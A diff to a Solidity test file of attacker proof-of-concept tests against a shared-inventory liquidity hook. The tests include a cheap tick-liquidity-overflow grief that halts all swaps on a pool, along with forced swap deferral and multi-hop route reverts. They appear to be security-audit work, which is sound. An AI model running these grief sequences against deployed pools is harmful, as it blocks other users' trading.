@@ -137,7 +137,11 @@ contract InventoryProbeToken is MockERC20 {
     }
 }
 
-/// @notice Attacker-driven PoCs against CLSharedInventoryHook (fixed core with AppDeficit).
+/// @notice Attacker-driven PoCs against CLSharedInventoryHook on infinity-core 7c1090e (the BSC deployment, no
+///         AppDeficit).
+/// @dev A, B, C are "mainstream": hookless full-range pools held by `whale` give them a large CL-wide
+///      `reservesOfApp` (as USDT/WBNB/CAKE have on BSC), so hook swaps remove inline. D is "long-tail": no other CL
+///      liquidity, so a swap that sells D into a hook pool defers its removal; selling A into PD (D,A) is inline.
 contract CLSharedInventoryHookAttackTest is Test, Deployers {
     using PoolIdLibrary for PoolKey;
     using CLPoolParametersHelper for bytes32;
@@ -155,13 +159,16 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
     MockERC20 tA;
     MockERC20 tB;
     MockERC20 tC;
+    MockERC20 tD;
     PoolKey p1; // (A,B)
     PoolKey p2; // (A,C)
     PoolKey p3; // (B,C)
+    PoolKey pD; // (D,A), D long-tail
 
     Actor attacker;
     Actor victim;
     Actor lp;
+    Actor whale;
 
     address CREATOR = makeAddr("creator");
     address EOA = makeAddr("attackerEOA");
@@ -172,10 +179,13 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
         attacker = new Actor(vault, poolManager, address(hook));
         victim = new Actor(vault, poolManager, address(hook));
         lp = new Actor(vault, poolManager, address(hook));
+        whale = new Actor(vault, poolManager, address(hook));
 
-        MockERC20[] memory ts = deployTokens(3, type(uint256).max);
-        (tA, tB, tC) = (ts[0], ts[1], ts[2]);
-        for (uint256 i; i < 3; i++) _fund(ts[i]);
+        MockERC20[] memory ts = deployTokens(4, type(uint256).max);
+        (tA, tB, tC, tD) = (ts[0], ts[1], ts[2], ts[3]);
+        for (uint256 i; i < 4; i++) _fund(ts[i]);
+        _seedReserve(tA, tB);
+        _seedReserve(tB, tC);
 
         address[] memory who = new address[](1);
         bool[] memory yes = new bool[](1);
@@ -185,6 +195,7 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
         p1 = _createPool(tA, tB, 2500, LOWER, UPPER, L);
         p2 = _createPool(tA, tC, 2500, LOWER, UPPER, L);
         p3 = _createPool(tB, tC, 2500, LOWER, UPPER, L);
+        pD = _createPool(tD, tA, 2500, LOWER, UPPER, L);
     }
 
     /*//////////////////////////////////////////////////////////////
@@ -193,7 +204,6 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
 
     function _fund(MockERC20 t) internal {
         t.transfer(address(hook), INVENTORY);
-        t.transfer(address(vault), 1e27); // physical backing for the in-afterSwap take (other pools' reserves)
         t.transfer(address(attacker), 1e24);
         t.transfer(address(victim), 1e24);
         t.transfer(address(lp), 1e24);
@@ -201,6 +211,19 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
 
     function _cfg(int24 lo, int24 hi, uint128 liq) internal pure returns (ICLSharedInventoryHook.PoolConfig memory) {
         return ICLSharedInventoryHook.PoolConfig({enabled: true, tickLower: lo, tickUpper: hi, liquidity: liq});
+    }
+
+    /// @dev Hookless full-range (a,b) pool holding ~1e27 of each: CL-wide reserve, as other pools provide on BSC.
+    function _seedReserve(MockERC20 a, MockERC20 b) internal {
+        a.transfer(address(whale), 2e27);
+        b.transfer(address(whale), 2e27);
+        PoolKey memory k = _keyFor(a, b, 500, address(0));
+        poolManager.initialize(k, SQRT_RATIO_1_1);
+        whale.run(_one(_liqOp(k, -887270, 887270, 1e27)), _cs(k));
+    }
+
+    function _dIs0() internal view returns (bool) {
+        return Currency.unwrap(pD.currency0) == address(tD);
     }
 
     function _keyFor(MockERC20 a, MockERC20 b, uint24 fee, address hooks) internal view returns (PoolKey memory k) {
@@ -265,7 +288,7 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
     }
 
     /*//////////////////////////////////////////////////////////////
-          1. SANDWICH / JIT EXTRACTION == STATIC LP (REFUTED)
+          1. SANDWICH / JIT EXTRACTION == STATIC LP (REFUTED, inline path)
     //////////////////////////////////////////////////////////////*/
 
     /// The JIT position is minted at the current price and burned after the swap, so for every swap it presents the
@@ -337,7 +360,8 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
     /// parks `maxLiquidityPerTick - L + 1` of its own liquidity on the hook's boundary tick (out of range, so
     /// single-sided). The hook's next mint overflows `liquidityGross` -> TickLiquidityOverflow -> EVERY swap on the
     /// pool reverts, in both directions, until the owner re-ranges (and the attacker can repeat). Near the extreme
-    /// ticks (a "full-range" config) this costs dust because sqrtPrice there is ~2^-64.
+    /// ticks (a "full-range" config) this costs dust because sqrtPrice there is ~2^-64. Mainstream pool: its swaps
+    /// remove inline, so no pending record holds the hook's L on the tick between swaps.
     function test_dos_tickLiquidityOverflow_wideRange_costsDust() public {
         int24 lo = -887270;
         int24 hi = 887270;
@@ -377,28 +401,122 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
         assertGt(need1, 1e29);
     }
 
+    /// The grief's (refundable) capital scales with the boundary tick: amount of token1 that
+    /// `maxLiquidityPerTick - L + 1` costs on [lo, lo + 10] at a 1:1 price, for L = 1e20.
+    function test_dos_griefCost_byBoundaryTick() public {
+        int24[4] memory los = [int24(-887270), -550000, -400000, -300000];
+        uint256[4] memory cost;
+        uint128 grief = Tick.tickSpacingToMaxLiquidityPerTick(10) - 1e20 + 1;
+        for (uint256 i; i < 4; i++) {
+            (, cost[i]) = LiquidityAmounts.getAmountsForLiquidity(
+                SQRT_RATIO_1_1, TickMath.getSqrtRatioAtTick(los[i]), TickMath.getSqrtRatioAtTick(los[i] + 10), grief
+            );
+            emit log_named_int("boundary tick", los[i]);
+            emit log_named_decimal_uint("  grief capital (token1, 18 dp)", cost[i], 18);
+        }
+        assertLt(cost[0], 1e11);
+        assertGt(cost[1], 1e18);
+        assertGt(cost[3], 1e23);
+    }
+
+    /// The same grief on a pool whose swaps DEFER (long-tail D sold in). While the pool's own position is parked
+    /// under the pending record, its `L` already sits on the boundary tick, so the attacker can only fill
+    /// `maxLiquidityPerTick - L`: the next swap's flush removes `L` before re-injecting it, and the pool keeps working.
+    /// A record parked there is cleared by any inline swap (here: selling mainstream A into the same pool). In that
+    /// lock the attacker adds the last unit and the pool is down in both directions, as on the inline path.
+    function test_dos_tickLiquidityOverflow_deferringPool_needsParkedRecordCleared() public {
+        int24 lo = -887270;
+        int24 hi = 887270;
+        uint128 l = 1e20;
+        PoolKey memory w = _createPool(tD, tA, 500, lo, hi, l);
+        bool sellD = Currency.unwrap(w.currency0) == address(tD);
+        _swap(victim, w, sellD, -1e18);
+        assertEq(_pendingL(), l, "long-tail input defers: w's L parked on the boundary");
+
+        uint128 maxPerTick = Tick.tickSpacingToMaxLiquidityPerTick(10);
+        int256 fill = int256(uint256(maxPerTick - l));
+        attacker.run(_one(_liqOp(w, lo, lo + 10, fill)), _cs(w));
+        _swap(victim, w, sellD, -1e18); // flush (-L) then inject (+L): fits, pool still works
+        assertEq(_pendingL(), l);
+        try attacker.run(_one(_liqOp(w, lo, lo + 10, 1)), _cs(w)) { // one more unit while parked: rejected
+            fail();
+        } catch (bytes memory err) {
+            assertTrue(_contains(err, Tick.TickLiquidityOverflow.selector));
+        }
+
+        // clear the record with an inline swap (A in), then add the last unit — same lock
+        Actor.Op[] memory ops = new Actor.Op[](2);
+        ops[0] = _swapOp(w, !sellD, -1e15);
+        ops[1] = _liqOp(w, lo, lo + 10, 1);
+        attacker.run(ops, _cs(w));
+        assertEq(_pendingL(), 0, "record cleared by the inline swap");
+
+        for (uint256 i; i < 2; i++) {
+            try victim.run(_one(_swapOp(w, i == 0, -1e18)), _cs(w)) {
+                fail();
+            } catch (bytes memory err) {
+                assertTrue(_contains(err, Tick.TickLiquidityOverflow.selector), "not TickLiquidityOverflow");
+            }
+        }
+    }
+
     /*//////////////////////////////////////////////////////////////
-          3. FORCING THE CATCH / DEFERRAL (REFUTED on fixed core)
+      3. DEFERRAL ON 7c1090e: FORCING IT, AND MULTI-HOP ROUTES
     //////////////////////////////////////////////////////////////*/
 
-    /// Attacker zeroes the pool manager's reservesOfApp for both tokens inside its own lock (pulls its resident LP
-    /// out of a hookless pool), then swaps the hooked pool in the same lock. On the old core the afterSwap burn
-    /// underflowed here; on the fixed core the shortfall is a transient AppDeficit, so the removal succeeds inline
-    /// and nothing is deferred.
-    function test_forceCatch_reserveDrainInSameLock_noDeferral() public {
-        PoolKey memory s = _keyFor(tA, tB, 3000, address(0));
+    /// Long-tail D whose only other CL liquidity is the attacker's own hookless pool (D,C), ~100 D. Selling 5 D into
+    /// PD removes inline while that reserve is there. Pulling the reserve out in the same lock first makes the same
+    /// swap defer: whoever holds a long-tail token's CL liquidity decides whether its hook swaps defer.
+    function test_forceDeferral_longTail_pullOwnReserveInSameLock() public {
+        PoolKey memory s = _keyFor(tD, tC, 3000, address(0));
         poolManager.initialize(s, SQRT_RATIO_1_1);
-        attacker.run(_one(_liqOp(s, LOWER, UPPER, int256(uint256(L)))), _cs(s));
+        attacker.run(_one(_liqOp(s, -887270, 887270, 100e18)), _cs(s));
+        Currency[] memory cs = new Currency[](3);
+        (cs[0], cs[1], cs[2]) = (Currency.wrap(address(tD)), Currency.wrap(address(tA)), Currency.wrap(address(tC)));
 
-        Actor.Op[] memory ops = new Actor.Op[](3);
-        ops[0] = _liqOp(s, LOWER, UPPER, -int256(uint256(L)));
-        ops[1] = _swapOp(p1, true, -20e18);
-        ops[2] = _swapOp(p1, false, -20e18);
-        attacker.run(ops, _cs(p1));
-        assertLe(vault.reservesOfApp(address(poolManager), p1.currency0), 10, "reserves drained by attacker");
-        assertEq(_pendingL(), 0, "deferral forced");
-        assertEq(poolManager.getLiquidity(p1.toId(), address(hook), LOWER, UPPER, SALT), 0, "position parked");
+        uint256 snap = vm.snapshotState();
+        attacker.run(_one(_swapOp(pD, _dIs0(), -5e18)), cs);
+        assertEq(_pendingL(), 0, "reserve present: inline");
+        vm.revertToState(snap);
+
+        Actor.Op[] memory ops = new Actor.Op[](2);
+        ops[0] = _liqOp(s, -887270, 887270, -100e18);
+        ops[1] = _swapOp(pD, _dIs0(), -5e18);
+        attacker.run(ops, cs);
+        assertEq(_pendingL(), L, "reserve pulled in the same lock: deferred");
         assertTrue(attacker.hookDeltaAlwaysClean());
+    }
+
+    /// Router pattern: several swaps in ONE lock, input paid at the end. Hop 1 sells long-tail D into PD and defers;
+    /// hop 2 (any hook pool) flushes in beforeSwap and `take`s PD's position (principal + hop-1 input) out of the vault.
+    /// The hop-1 input is not paid yet and the vault holds no other D, so the token transfer underflows and the whole
+    /// route reverts. Nothing is lost. A single-hop D sale, or a route whose first hop removes inline, succeeds.
+    function test_multiHop_longTailFirstHopDefers_routeReverts() public {
+        Currency[] memory cs = new Currency[](3);
+        (cs[0], cs[1], cs[2]) = (Currency.wrap(address(tD)), Currency.wrap(address(tA)), Currency.wrap(address(tB)));
+        bool aIs0p1 = Currency.unwrap(p1.currency0) == address(tA);
+        Actor.Op[] memory ops = new Actor.Op[](2);
+        ops[0] = _swapOp(pD, _dIs0(), -5e18); // D -> A: defers
+        ops[1] = _swapOp(p1, aIs0p1, -1e18); // A -> B: flush takes D the vault does not hold yet
+        uint256 d0 = tD.balanceOf(address(hook));
+        try victim.run(ops, cs) {
+            fail();
+        } catch (bytes memory err) {
+            assertTrue(_contains(err, bytes4(keccak256("Panic(uint256)"))), "not the vault's D transfer");
+        }
+        assertEq(tD.balanceOf(address(hook)), d0, "route reverted as a whole");
+
+        uint256 snap = vm.snapshotState();
+        victim.run(_one(ops[0]), cs); // single hop: deferred, then flushed by any later swap
+        assertEq(_pendingL(), L);
+        _swap(victim, p3, true, -1e18);
+        assertEq(_pendingL(), 0);
+        vm.revertToState(snap);
+
+        ops[0] = _swapOp(pD, !_dIs0(), -5e18); // A -> D: mainstream input, inline
+        ops[1] = _swapOp(p1, aIs0p1, -1e18);
+        victim.run(ops, cs);
+        assertEq(_pendingL(), 0);
     }
 
     /*//////////////////////////////////////////////////////////////
@@ -427,10 +545,10 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
         assertEq(tA.balanceOf(address(hook)), hookA);
     }
 
-    /// Read-only reentrancy: while the vault pays the hook in afterSwap (currency0 leg first), a token callback sees
-    /// `inventoryOf` with the input credited but the output not yet paid — the pair sum is inflated by ~the swap
+    /// Inline path: while the vault pays the hook in afterSwap (currency0 leg first), a token callback sees
+    /// `inventoryOf` with the input credited but the output not yet paid — the pair sum is higher by ~the swap
     /// output. Only matters to an integrator that prices something off `inventoryOf` mid-swap.
-    function test_readOnlyReentrancy_inventoryOfInflatedMidSwap() public {
+    function test_inventoryOfMidSwap_inputCreditedBeforeOutputPaid() public {
         InventoryProbeToken probe;
         for (uint256 i;; i++) {
             probe = new InventoryProbeToken{salt: bytes32(i)}();
@@ -438,6 +556,7 @@ contract CLSharedInventoryHookAttackTest is Test, Deployers {
         }
         probe.mint(address(this), 1e30);
         _fund(MockERC20(address(probe)));
+        _seedReserve(MockERC20(address(probe)), tA); // inline path
         PoolKey memory k = _createPool(MockERC20(address(probe)), tA, 2500, LOWER, UPPER, L);
         int256 before = _hookSum(k);
         probe.arm(address(hook), k.currency1);
